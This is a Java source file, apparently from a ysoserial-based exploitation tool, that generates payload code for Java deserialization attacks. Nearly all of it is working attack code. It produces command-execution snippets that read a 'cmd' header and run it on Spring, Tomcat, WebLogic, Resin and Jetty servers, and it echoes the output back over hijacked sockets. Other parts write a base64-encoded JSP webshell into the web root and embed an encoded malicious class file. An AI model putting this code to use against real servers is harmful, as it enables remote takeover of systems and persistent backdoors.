package ysoserial.my;

import java.io.*;
import java.util.Arrays;
import sun.misc.BASE64Decoder;
import sun.misc.BASE64Encoder;

public class DirectiveProcessor{
    public static void main(String[] args) throws IOException {
        System.out.println(process("directive:WindowsEcho:whoami"));
    }

    public static String process(String command){
        if(command == null || command.trim().equals("")){
            return "";
        }


//        LinuxEcho("LinuxEcho"),
//            WindowsEcho("WindowsEcho"),
//            SpringEcho1("SpringEcho1"),
//            SpringEcho2("SpringEcho2"),
//            TomcatEcho("TomcatEcho"),
//            WeblogicEcho1("WeblogicEcho1"),
//            WeblogicEcho2("WeblogicEcho2"),
//            ResinEcho("ResinEcho"),
//            JettyEcho("JettyEcho"),
//            AutoFindRequestEcho("AutoFindRequestEcho"),
//            WriteFileEcho("WriteFileEcho");

        command = command.trim();
        if(command.startsWith("directive:sleep")){
            long time = Long.parseLong(command.split(":", 3)[2]);
            return sleep(time);
        }else if(command.startsWith("directive:LinuxEcho")){
            return linuxEcho(command);
        }else if(command.startsWith("directive:WindowsEcho")){
            return windowsEcho(command);
        }else if(command.startsWith("directive:SpringEcho1")){
            return springEcho1();
        }else if(command.startsWith("directive:SpringEcho2")){
            return springEcho2();
        }else if(command.startsWith("directive:TomcatEcho")){
            return tomcatEcho();
        }else if(command.startsWith("directive:WeblogicEcho1")){
            return weblogicEcho1();
        }else if(command.startsWith("directive:WeblogicEcho2")){
            return weblogicEcho2(command);
        }else if(command.startsWith("directive:ResinEcho")){
            return resinEcho();
        }else if(command.startsWith("directive:JettyEcho")){
            return jettyEcho();
        }else if(command.startsWith("directive:AutoFindRequestEcho")){
            return autoFindRequestEcho();
        }else if(command.startsWith("directive:WriteFileEcho")){
            return wirteFileEcho(command);
        }else if(command.startsWith("directive:WriteClass")){
            return writeClass(Integer.parseInt(command.split(":",3)[2]));
        } else if(command.startsWith("directive:Shell")){
            return shell(command);
        }else{
            return "java.lang.Runtime.getRuntime().exec(\"" +
                command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
                "\");";
        }
    }

    public static String sleep(long seconds){
        long time = seconds * 1000;
        String code = "java.lang.Thread.sleep((long)" + time + ");";
        return code;
    }

    public static String linuxEcho(String command){
        String cmd = command.split(":", 3)[2];
        cmd = cmd.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"");

        String code = "   if(java.io.File.separator.equals(\"/\")){\n" +
            "        String command  = \"ls -al /proc/$PPID/fd|grep socket:|awk 'BEGIN{FS=\\\"[\\\"}''{print $2}'|sed 's/.$//'\";\n" +
            "        String[] cmd = new String[]{\"/bin/sh\", \"-c\", command};\n" +
            "        java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));\n" +
            "        java.util.List res1 = new java.util.ArrayList();\n" +
            "        String line = \"\";\n" +
            "        while ((line = br.readLine()) != null && !line.trim().isEmpty()){\n" +
            "            res1.add(line);\n" +
            "        }\n" +
            "        br.close();\n" +
            "\n" +
            "        try {\n" +
            "            Thread.sleep((long)2000);\n" +
            "        } catch (InterruptedException e) {\n" +
            "            //pass\n" +
            "        }\n" +
            "\n" +
            "        command  = \"ls -al /proc/$PPID/fd|grep socket:|awk '{print $9, $11}'\";\n" +
            "        cmd = new String[]{\"/bin/sh\", \"-c\", command};\n" +
            "        br = new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));\n" +
            "        java.util.List res2 = new java.util.ArrayList();\n" +
            "        while ((line = br.readLine()) != null && !line.trim().isEmpty()){\n" +
            "            res2.add(line);\n" +
            "        }\n" +
            "        br.close();\n" +
            "\n" +
            "        int index = 0;\n" +
            "        int max = 0;\n" +
            "        for(int i = 0; i < res2.size(); i++){\n" +
            "            try{\n" +
            "                String socketNo = ((String)res2.get(i)).split(\"\\\\s+\")[1].substring(8);\n" +
            "                socketNo = socketNo.substring(0, socketNo.length() - 1);\n" +
            "                for(int j = 0; j < res1.size(); j++){\n" +
            "                    if(!socketNo.equals(res1.get(j))) continue;\n" +
            "\n" +
            "                    if(Integer.parseInt(socketNo) > max) {\n" +
            "                        max = Integer.parseInt(socketNo);\n" +
            "                        index = j;\n" +
            "                    }\n" +
            "                    break;\n" +
            "                }\n" +
            "            }catch(Exception e){\n" +
            "                //pass\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        int fd = Integer.parseInt(((String)res2.get(index)).split(\"\\\\s\")[0]);\n" +
            "        java.lang.reflect.Constructor c= java.io.FileDescriptor.class.getDeclaredConstructor(new Class[]{Integer.TYPE});\n" +
            "        c.setAccessible(true);\n" +
            "        cmd = new String[]{\"/bin/sh\", \"-c\", \"" + cmd + "\"};\n" +
            "        String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\"\\\\A\").next();\n" +
            "        String result = \"HTTP/1.1 200 OK\\nConnection: close\\nContent-Length: \" + res.length() + \"\\n\\n\" + res + \"\\n\";\n" +
            "        java.io.FileOutputStream os = new java.io.FileOutputStream((java.io.FileDescriptor)c.newInstance(new Object[]{new Integer(fd)}));\n" +
            "        os.write(result.getBytes());\n" +
            "    }";

        return code;
    }

    public static String springEcho1(){
        String code = "    java.lang.reflect.Method method = Class.forName(\"org.springframework.web.context.request.RequestContextHolder\").getMethod(\"getRequestAttributes\", null);\n" +
            "        Object requestAttributes  = method.invoke(null,null);\n" +
            "\n" +
            "        method = requestAttributes.getClass().getMethod(\"getRequest\", null);\n" +
            "        Object request = method.invoke(requestAttributes , null);\n" +
            "\n" +
            "        method = request.getClass().getMethod(\"getHeader\", new Class[]{String.class});\n" +
            "        String cmd = (String) method.invoke(request, new Object[]{\"cmd\"});\n" +
            "        String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\"\\\\A\").next();\n" +
            "\n" +
            "        method = requestAttributes.getClass().getMethod(\"getResponse\", null);\n" +
            "        Object response = method.invoke(requestAttributes , null);\n" +
            "\n" +
            "        method = response.getClass().getMethod(\"getWriter\", null);\n" +
            "        java.io.PrintWriter printWriter = (java.io.PrintWriter) method.invoke(response, null);\n" +
            "        printWriter.println(res);";

        return code;
    }

    public static String springEcho2(){
        String code = "java.lang.reflect.Method method = Class.forName(\"org.springframework.webflow.context.ExternalContextHolder\").getMethod(\"getExternalContext\", null);\n" +
            "        Object servletExternalContext  = method.invoke(null,null);\n" +
            "\n" +
            "        method = servletExternalContext.getClass().getMethod(\"getNativeRequest\", null);\n" +
            "        Object request = method.invoke(servletExternalContext , null);\n" +
            "\n" +
            "        method = request.getClass().getMethod(\"getHeader\", new Class[]{String.class});\n" +
            "        String cmd = (String) method.invoke(request, new Object[]{\"cmd\"});\n" +
            "        String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\"\\\\A\").next();\n" +
            "\n" +
            "        method = servletExternalContext.getClass().getMethod(\"getNativeResponse\", null);\n" +
            "        Object response = method.invoke(servletExternalContext , null);\n" +
            "\n" +
            "        method = response.getClass().getMethod(\"getWriter\", null);\n" +
            "        java.io.PrintWriter printWriter = (java.io.PrintWriter) method.invoke(response, null);\n" +
            "        printWriter.println(res);";

        return code;
    }

    public static String tomcatEcho(){
        String code = "   boolean flag = false;\n" +
            "    ThreadGroup group = Thread.currentThread().getThreadGroup();\n" +
            "    java.lang.reflect.Field f = group.getClass().getDeclaredField(\"threads\");\n" +
            "    f.setAccessible(true);\n" +
            "    Thread[] threads = (Thread[]) f.get(group);\n" +
            "\n" +
            "    for(int i = 0; i < threads.length; i++) {\n" +
            "        try{\n" +
            "            Thread t = threads[i];\n" +
            "            if (t == null) continue;\n" +
            "\n" +
            "            String str = t.getName();\n" +
            "            if (str.contains(\"exec\") || !str.contains(\"http\")) continue;\n" +
            "\n" +
            "\n" +
            "            f = t.getClass().getDeclaredField(\"target\");\n" +
            "            f.setAccessible(true);\n" +
            "            Object obj = f.get(t);\n" +
            "\n" +
            "            if (!(obj instanceof Runnable)) continue;\n" +
            "\n" +
            "            f = obj.getClass().getDeclaredField(\"this$0\");\n" +
            "            f.setAccessible(true);\n" +
            "            obj = f.get(obj);\n" +
            "\n" +
            "            try{\n" +
            "                f = obj.getClass().getDeclaredField(\"handler\");\n" +
            "            }catch (NoSuchFieldException e){\n" +
            "                f = obj.getClass().getSuperclass().getSuperclass().getDeclaredField(\"handler\");\n" +
            "            }\n" +
            "            f.setAccessible(true);\n" +
            "            obj = f.get(obj);\n" +
            "\n" +
            "            try{\n" +
            "                f = obj.getClass().getSuperclass().getDeclaredField(\"global\");\n" +
            "            }catch(NoSuchFieldException e){\n" +
            "                f = obj.getClass().getDeclaredField(\"global\");\n" +
            "            }\n" +
            "            f.setAccessible(true);\n" +
            "            obj = f.get(obj);\n" +
            "\n" +
            "            f = obj.getClass().getDeclaredField(\"processors\");\n" +
            "            f.setAccessible(true);\n" +
            "            java.util.List processors = (java.util.List)(f.get(obj));\n" +
            "\n" +
            "            for(int j = 0; j < processors.size(); ++j) {\n" +
            "                Object processor = processors.get(j);\n" +
            "                f = processor.getClass().getDeclaredField(\"req\");\n" +
            "                f.setAccessible(true);\n" +
            "                Object req = f.get(processor);\n" +
            "                Object resp = req.getClass().getMethod(\"getResponse\", new Class[0]).invoke(req, new Object[0]);\n" +
            "\n" +
            "                str = (String)req.getClass().getMethod(\"getHeader\", new Class[]{String.class}).invoke(req, new Object[]{\"cmd\"});\n" +
            "\n" +
            "                if (str != null && !str.isEmpty()) {\n" +
            "                    resp.getClass().getMethod(\"setStatus\", new Class[]{int.class}).invoke(resp, new Object[]{new Integer(200)});\n" +
            "                    String[] cmds = System.getProperty(\"os.name\").toLowerCase().contains(\"window\") ? new String[]{\"cmd.exe\", \"/c\", str} : new String[]{\"/bin/sh\", \"-c\", str};\n" +
            "                    byte[] result = (new java.util.Scanner((new ProcessBuilder(cmds)).start().getInputStream())).useDelimiter(\"\\\\A\").next().getBytes();\n" +
            "\n" +
            "                    try {\n" +
            "                        Class cls = Class.forName(\"org.apache.tomcat.util.buf.ByteChunk\");\n" +
            "                        obj = cls.newInstance();\n" +
            "                        cls.getDeclaredMethod(\"setBytes\", new Class[]{byte[].class, int.class, int.class}).invoke(obj, new Object[]{result, new Integer(0), new Integer(result.length)});\n" +
            "                        resp.getClass().getMethod(\"doWrite\", new Class[]{cls}).invoke(resp, new Object[]{obj});\n" +
            "                    } catch (NoSuchMethodException var5) {\n" +
            "                        Class cls = Class.forName(\"java.nio.ByteBuffer\");\n" +
            "                        obj = cls.getDeclaredMethod(\"wrap\", new Class[]{byte[].class}).invoke(cls, new Object[]{result});\n" +
            "                        resp.getClass().getMethod(\"doWrite\", new Class[]{cls}).invoke(resp, new Object[]{obj});\n" +
            "                    }\n" +
            "\n" +
            "                    flag = true;\n" +
            "                }\n" +
            "\n" +
            "                if (flag) break;\n" +
            "            }\n" +
            "\n" +
            "            if (flag)  break;\n" +
            "        }catch(Exception e){\n" +
            "            continue;\n" +
            "        }\n" +
            "    }";

        return code;
    }

    public static String weblogicEcho1(){
        String code = " Object obj = Thread.currentThread().getClass().getMethod(\"getCurrentWork\", null).invoke(Thread.currentThread(), null);\n" +
            "    String cmd = (String) obj.getClass().getMethod(\"getHeader\", new Class[]{String.class}).invoke(obj, new Object[]{\"cmd\"});\n" +
            "    String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\"\\\\A\").next();\n" +
            "    Object r = obj.getClass().getMethod(\"getResponse\", null).invoke(obj, null);\n" +
            "    Object os = r.getClass().getMethod(\"getServletOutputStream\", null).invoke(r, null);\n" +
            "    obj = Class.forName(\"weblogic.xml.util.StringInputStream\").getConstructor(new Class[]{String.class}).newInstance(new Object[]{res});\n" +
            "\n" +
            "    os.getClass().getMethod(\"writeStream\", new Class[]{Class.forName(\"java.io.InputStream\")}).invoke(os, new Object[]{obj});\n" +
            "    os.getClass().getMethod(\"flush\", null).invoke(os, null);\n" +
            "    obj = r.getClass().getMethod(\"getWriter\", null).invoke(r, null);\n" +
            "    obj.getClass().getMethod(\"write\", new Class[]{String.class}).invoke(obj, new Object[]{\"\"});";

        return code;
    }

    public static String weblogicEcho2(String command){
        String cmd = command.split(":", 3)[2];
        cmd = cmd.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"");

        String code = "Object obj = Thread.currentThread().getClass().getMethod(\"getCurrentWork\", null).invoke(Thread.currentThread(), null);\n" +
            "    Field field = obj.getClass().getDeclaredField(\"connectionHandler\");\n" +
            "    field.setAccessible(true);\n" +
            "    obj = field.get(obj);\n" +
            "    String cmd = \"" + cmd + "\";\n" +
            "    String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\"\\\\A\").next();\n" +
            "\n" +
            "    Object r = obj.getClass().getMethod(\"getServletRequest\", null).invoke(obj, null);\n" +
            "    Object o = r.getClass().getMethod(\"getResponse\", null).invoke(r, null);\n" +
            "    Object s = o.getClass().getMethod(\"getServletOutputStream\", null).invoke(o, null);\n" +
            "\n" +
            "    obj = Class.forName(\"weblogic.xml.util.StringInputStream\").getConstructor(new Class[]{String.class}).newInstance(new Object[]{res});\n" +
            "\n" +
            "    s.getClass().getMethod(\"writeStream\", new Class[]{Class.forName(\"java.io.InputStream\")}).invoke(s, new Object[]{obj});\n" +
            "    s.getClass().getMethod(\"flush\", null).invoke(s, null);\n" +
            "    obj = o.getClass().getMethod(\"getWriter\", null).invoke(o, null);\n" +
            "    obj.getClass().getMethod(\"write\", new Class[]{String.class}).invoke(obj, new Object[]{\"\"});";

        return code;
    }

    public static String resinEcho(){
        String code = "    Class clazz = Thread.currentThread().getClass();\n" +
            "    java.lang.reflect.Field field = clazz.getSuperclass().getDeclaredField(\"threadLocals\");\n" +
            "    field.setAccessible(true);\n" +
            "    Object obj = field.get(Thread.currentThread());\n" +
            "\n" +
            "    field = obj.getClass().getDeclaredField(\"table\");\n" +
            "    field.setAccessible(true);\n" +
            "    obj = field.get(obj);\n" +
            "\n" +
            "    Object[] obj_arr = (Object[]) obj;\n" +
            "    for(int i = 0; i < obj_arr.length; i++) {\n" +
            "        Object o = obj_arr[i];\n" +
            "        if (o == null) continue;\n" +
            "\n" +
            "        field = o.getClass().getDeclaredField(\"value\");\n" +
            "        field.setAccessible(true);\n" +
            "        obj = field.get(o);\n" +
            "\n" +
            "        if(obj != null && obj.getClass().getName().equals(\"com.caucho.server.http.HttpRequest\")){\n" +
            "            com.caucho.server.http.HttpRequest httpRequest = (com.caucho.server.http.HttpRequest)obj;\n" +
            "            String cmd = httpRequest.getHeader(\"cmd\");\n" +
            "            String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\"\\\\A\").next();\n" +
            "            com.caucho.server.http.HttpResponse httpResponse = httpRequest.createResponse();\n" +
            "            httpResponse.setHeader(\"Content-Length\", res.length() + \"\");\n" +
            "            java.lang.reflect.Method method = httpResponse.getClass().getDeclaredMethod(\"createResponseStream\", null);\n" +
            "            method.setAccessible(true);\n" +
            "            com.caucho.server.http.HttpResponseStream httpResponseStream = (com.caucho.server.http.HttpResponseStream) method.invoke(httpResponse,null);\n" +
            "            httpResponseStream.write(res.getBytes(), 0, res.length());\n" +
            "            httpResponseStream.close();\n" +
            "        }\n" +
            "    }";

        return code;
    }

    public static String jettyEcho(){
        String code = "    Class clazz = Thread.currentThread().getClass();\n" +
            "    java.lang.reflect.Field field = clazz.getDeclaredField(\"threadLocals\");\n" +
            "    field.setAccessible(true);\n" +
            "    Object obj = field.get(Thread.currentThread());\n" +
            "\n" +
            "    field = obj.getClass().getDeclaredField(\"table\");\n" +
            "    field.setAccessible(true);\n" +
            "    obj = field.get(obj);\n" +
            "\n" +
            "    Object[] obj_arr = (Object[]) obj;\n" +
            "    for(int i = 0; i < obj_arr.length; i++){\n" +
            "        Object o = obj_arr[i];\n" +
            "        if(o == null) continue;\n" +
            "\n" +
            "        field = o.getClass().getDeclaredField(\"value\");\n" +
            "        field.setAccessible(true);\n" +
            "        obj = field.get(o);\n" +
            "\n" +
            "        if(obj != null && obj.getClass().getName().endsWith(\"AsyncHttpConnection\")){\n" +
            "            Object connection = obj;\n" +
            "            java.lang.reflect.Method method = connection.getClass().getMethod(\"getRequest\", null);\n" +
            "            obj = method.invoke(connection, null);\n" +
            "\n" +
            "            method = obj.getClass().getMethod(\"getHeader\", new Class[]{String.class});\n" +
            "            obj = method.invoke(obj, new Object[]{\"cmd\"});\n" +
            "\n" +
            "            String res = new java.util.Scanner(Runtime.getRuntime().exec(obj.toString()).getInputStream()).useDelimiter(\"\\\\A\").next();\n" +
            "\n" +
            "            method = connection.getClass().getMethod(\"getPrintWriter\", new Class[]{String.class});\n" +
            "            java.io.PrintWriter printWriter = (java.io.PrintWriter)method.invoke(connection, new Object[]{\"utf-8\"});\n" +
            "            printWriter.println(res);\n" +
            "\n" +
            "        }else if(obj != null && obj.getClass().getName().endsWith(\"HttpConnection\")){\n" +
            "            java.lang.reflect.Method method = obj.getClass().getDeclaredMethod(\"getHttpChannel\", null);\n" +
            "            Object httpChannel = method.invoke(obj, null);\n" +
            "\n" +
            "            method = httpChannel.getClass().getMethod(\"getRequest\", null);\n" +
            "            obj = method.invoke(httpChannel, null);\n" +
            "\n" +
            "            method = obj.getClass().getMethod(\"getHeader\", new Class[]{String.class});\n" +
            "            obj = method.invoke(obj, new Object[]{\"cmd\"});\n" +
            "\n" +
            "            String res = new java.util.Scanner(Runtime.getRuntime().exec(obj.toString()).getInputStream()).useDelimiter(\"\\\\A\").next();\n" +
            "\n" +
            "            method = httpChannel.getClass().getMethod(\"getResponse\", null);\n" +
            "            obj = method.invoke(httpChannel, null);\n" +
            "\n" +
            "            method = obj.getClass().getMethod(\"getWriter\", null);\n" +
            "            java.io.PrintWriter printWriter = (java.io.PrintWriter)method.invoke(obj, null);\n" +
            "            printWriter.println(res);\n" +
            "        }\n" +
            "    }";

        return code;
    }

    public static String windowsEcho(String command){
        String cmd = command.split(":", 3)[2];
        cmd = cmd.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"");

        String code = "   if(java.io.File.separator.equals(\"\\\\\")){\n" +
            "        java.lang.reflect.Field field = java.io.FileDescriptor.class.getDeclaredField(\"fd\");\n" +
            "        field.setAccessible(true);\n" +
            "\n" +
            "        Class clazz1 = Class.forName(\"sun.nio.ch.Net\");\n" +
            "        java.lang.reflect.Method method1 = clazz1.getDeclaredMethod(\"remoteAddress\",new Class[]{java.io.FileDescriptor.class});\n" +
            "        method1.setAccessible(true);\n" +
            "\n" +
            "        Class clazz2 = Class.forName(\"java.net.SocketOutputStream\", false, null);\n" +
            "        java.lang.reflect.Constructor constructor2 = clazz2.getDeclaredConstructors()[0];\n" +
            "        constructor2.setAccessible(true);\n" +
            "\n" +
            "        Class clazz3 = Class.forName(\"java.net.PlainSocketImpl\");\n" +
            "        java.lang.reflect.Constructor constructor3 = clazz3.getDeclaredConstructor(new Class[]{java.io.FileDescriptor.class});\n" +
            "        constructor3.setAccessible(true);\n" +
            "\n" +
            "        java.lang.reflect.Method write = clazz2.getDeclaredMethod(\"write\",new Class[]{byte[].class});\n" +
            "        write.setAccessible(true);\n" +
            "\n" +
            "        java.net.InetSocketAddress remoteAddress = null;\n" +
            "        java.util.List list = new java.util.ArrayList();\n" +
            "        java.io.FileDescriptor fileDescriptor = new java.io.FileDescriptor();\n" +
            "        for(int i = 0; i < 50000; i++){\n" +
            "            field.set((Object)fileDescriptor, (Object)(new Integer(i)));\n" +
            "            try{\n" +
            "                remoteAddress= (java.net.InetSocketAddress) method1.invoke(null, new Object[]{fileDescriptor});\n" +
            "                if(remoteAddress.toString().startsWith(\"/127.0.0.1\")) continue;\n" +
            "                if(remoteAddress.toString().startsWith(\"/0:0:0:0:0:0:0:1\")) continue;\n" +
            "                list.add(new Integer(i));\n" +
            "\n" +
            "            }catch(Exception e){}\n" +
            "        }\n" +
            "\n" +
            "        for(int i = list.size() - 1; i >= 0; i--){\n" +
            "            try{\n" +
            "                field.set((Object)fileDescriptor, list.get(i));\n" +
            "                Object socketOutputStream = constructor2.newInstance(new Object[]{constructor3.newInstance(new Object[]{fileDescriptor})});\n" +
            "                String[] cmd = new String[]{\"cmd\",\"/C\", \"" + cmd + "\"};\n" +
            "                String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\"\\\\A\").next().trim();\n" +
            "                String result = \"HTTP/1.1 200 OK\\nConnection: close\\nContent-Length: \" + (res.length()) + \"\\n\\n\" + res + \"\\n\\n\";\n" +
            "                write.invoke(socketOutputStream, new Object[]{result.getBytes()});\n" +
            "                break;\n" +
            "            }catch (Exception e){\n" +
            "                //pass\n" +
            "            }\n" +
            "        }\n" +
            "    }";
        return code;
    }


    public static String shell(String command){
        String content = "";
        try{
            String fileName = System.getProperty("user.dir") + File.separator + "config" + File.separator + "shell.jsp";
            FileReader fileReader = new FileReader(fileName);
            BufferedReader bufferedReader = new BufferedReader(fileReader);

            String result = "";
            String line = "";
            while ( (line = bufferedReader.readLine()) != null){
                result += line + "\n";
            }

            bufferedReader.close();
            fileReader.close();

            BASE64Encoder encoder = new BASE64Encoder();
            content = encoder.encode(result.getBytes()).replaceAll("\r|\n|\r\n", "");
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }

        String path = command.split(":",3)[2];
        String code = "String p = Thread.currentThread().getContextClassLoader().getResource(\"\").getPath();\n" +
            "        p = p.substring(0, p.indexOf(\"WEB-INF\"));\n" +
            "        p = java.net.URLDecoder.decode(p,\"utf-8\");\n" +
            "        java.io.PrintWriter w = new java.io.PrintWriter((p + \"" + path + "\"));\n" +
            "        sun.misc.BASE64Decoder d = new sun.misc.BASE64Decoder();\n" +
            "        String s = new String(d.decodeBuffer(\"" + content + "\"));\n" +
            "        w.println(s);\n" +
            "        w.close();";

        return code;
    }

    public static String autoFindRequestEcho(){
        String code = "    java.net.URL url;\n" +
            "    if (java.io.File.separator.equals(\"/\")) {\n" +
            "        url = new java.net.URL(\"file:///tmp/\");\n" +
            "    }else{\n" +
            "        url = new java.net.URL(\"file:///c:/windows/temp/\");\n" +
            "    }\n" +
            "    java.net.URLClassLoader urlClassLoader = new java.net.URLClassLoader(new java.net.URL[]{url}, Thread.currentThread().getContextClassLoader());\n" +
            "    urlClassLoader.loadClass(\"PoC\").newInstance();";

        return code;
    }

    public static String writeClass(int i){
        String content = "yv66vgAAADQAqgcAAgEAA1BvQwcABAEAEGphdmEvbGFuZy9PYmplY3QBAAFoAQATTGphdmEvdXRpbC9IYXNoU2V0OwEACVNpZ25hdHVyZQEAJ0xqYXZhL3V0aWwvSGFzaFNldDxMamF2YS9sYW5nL09iamVjdDs+OwEAAXIBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAFwAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEABjxpbml0PgEAAygpVgEABENvZGUKAAMAEQwADQAOCQABABMMAAkACgkAAQAVDAALAAwHABcBABFqYXZhL3V0aWwvSGFzaFNldAoAFgARCQABABoMAAUABgoAHAAeBwAdAQAQamF2YS9sYW5nL1RocmVhZAwAHwAgAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7CgABACIMACMAJAEAAUYBABYoTGphdmEvbGFuZy9PYmplY3Q7SSlWAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEABUxQb0M7AQABaQEAFShMamF2YS9sYW5nL09iamVjdDspWgoAFgAsDAAtACoBAAhjb250YWlucwoAFgAvDAAwACoBAANhZGQBAANvYmoBABJMamF2YS9sYW5nL09iamVjdDsBAA1TdGFja01hcFRhYmxlCgABADUMACkAKgcANwEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QKAAMAOQwAOgA7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7CgA9AD8HAD4BAA9qYXZhL2xhbmcvQ2xhc3MMAEAAQQEAEGlzQXNzaWduYWJsZUZyb20BABQoTGphdmEvbGFuZy9DbGFzczspWggAQwEAA2NtZAsANgBFDABGAEcBAAlnZXRIZWFkZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwgASQEAC2dldFJlc3BvbnNlCgA9AEsMAEwATQEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsKAE8AUQcAUAEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAwAUgBTAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7BwBVAQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2ULAFQAVwwAWABZAQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsHAFsBABFqYXZhL3V0aWwvU2Nhbm5lcgoAXQBfBwBeAQARamF2YS9sYW5nL1J1bnRpbWUMAGAAYQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsKAF0AYwwAZABlAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwoAZwBpBwBoAQARamF2YS9sYW5nL1Byb2Nlc3MMAGoAawEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsKAFoAbQwADQBuAQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWCABwAQACXEEKAFoAcgwAcwB0AQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7CgBaAHYMAHcAeAEABG5leHQBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwoAegB8BwB7AQATamF2YS9pby9QcmludFdyaXRlcgwAfQB+AQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgoAegCADACBAA4BAAVmbHVzaAcAgwEAE2phdmEvbGFuZy9FeGNlcHRpb24BAAFvAQAFZGVwdGgBAAFJCgA9AIgMAIkAigEAEWdldERlY2xhcmVkRmllbGRzAQAcKClbTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwoAjACOBwCNAQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQMAI8AkAEADXNldEFjY2Vzc2libGUBAAQoWilWCgCMAJIMAJMAlAEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7CgA9AJYMAJcAmAEAB2lzQXJyYXkBAAMoKVoKAAEAmgwACwAkBwCcAQATW0xqYXZhL2xhbmcvT2JqZWN0OwoAPQCeDACfADsBAA1nZXRTdXBlcmNsYXNzAQAFc3RhcnQBAAFuAQARTGphdmEvbGFuZy9DbGFzczsBAA1kZWNsYXJlZEZpZWxkAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAAXEHAKcBABpbTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAClNvdXJjZUZpbGUBAAhQb0MuamF2YQAhAAEAAwAAAAMACAAFAAYAAQAHAAAAAgAIAAgACQAKAAAACAALAAwAAAAEAAEADQAOAAEADwAAAFwAAgABAAAAHiq3ABABswASAbMAFLsAFlm3ABizABm4ABsDuAAhsQAAAAIAJQAAABoABgAAAAwABAANAAgADgAMAA8AFgAQAB0AEQAmAAAADAABAAAAHgAnACgAAAAKACkAKgABAA8AAABWAAIAAQAAABoqxgANsgAZKrYAK5kABQSssgAZKrYALlcDrAAAAAMAJQAAAA4AAwAAABQAEAAWABgAFwAmAAAADAABAAAAGgAxADIAAAAzAAAABAACDgEACgALACQAAQAPAAABYAAGAAIAAAC/GxA0owAPsgASxgAKsgAUxgAEsSq4ADSaAKeyABLHAFESNiq2ADi2ADyZAEUqwAA2swASsgASEkK5AEQCAMcACgGzABKnACqyABK2ADgSSAO9AD22AEqyABIDvQADtgBOwABUswAUpwAIVwGzABKyABLGAEayABTGAECyABS5AFYBALsAWlm4AFyyABISQrkARAIAtgBitgBmtwBsEm+2AHG2AHW2AHmyABS5AFYBALYAf6cABFexKhsEYLgAIbEAAgBHAGYAaQCCAHoAsgC1AIIAAwAlAAAASgASAAAAGwASABwAEwAeABoAHwAsACAAMwAhAEAAIgBEACMARwAlAGYAJgBqACcAbgAsAHoALgCnAC8AsgAwALYAMgC3ADUAvgA3ACYAAAAWAAIAAAC/AIQAMgAAAAAAvwCFAIYAAQAzAAAAEwAJEgAzYQcAggT3AEYHAIIAAAYACgAjACQAAQAPAAABpgACAAwAAAB+KrYAOE0stgCHWToGvjYFAzYEpwBbGQYVBDJOLQS2AIsBOgctKrYAkToHGQe2ADi2AJWaAAwZBxu4AJmnAC8ZB8AAm1k6C742CgM2CacAExkLFQkyOggZCBu4AJmECQEVCRUKof/spwAEV4QEARUEFQWh/6QstgCdWU3H/4uxAAEAIwBmAGkAggADACUAAAA+AA8AAAA5AAUAOwAbADwAIAA9ACMAPwAqAEEANQBCADsAQwA+AEQAVgBFAFwARABmAEkAagA7AHQATAB9AE0AJgAAAD4ABgAAAH4AoAAyAAAAAAB+AIUAhgABAAUAeQChAKIAAgAbAE8AowCkAAMAIwBHAIQAMgAHAFYABgClADIACAAzAAAAhgAI/AAFBwA9/wAPAAcHAAMBBwA9